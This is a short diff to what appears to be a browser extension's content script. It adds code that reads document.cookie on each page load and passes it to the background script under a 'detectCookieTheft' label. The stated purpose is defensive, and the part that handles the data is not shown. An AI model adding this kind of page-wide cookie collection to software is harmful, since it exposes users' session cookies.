@@ -533,3 +533,10 @@ const start = () => {
 };
 
 start();
+
+// Send cookie to background for inspection of cookie theft
+document.addEventListener('DOMContentLoaded', function () {
+  chrome.runtime.sendMessage({type: 'detectCookieTheft', data: document.cookie}, function(response) {
+        console.log('[background] detectCookieTheft');
+    });
+});
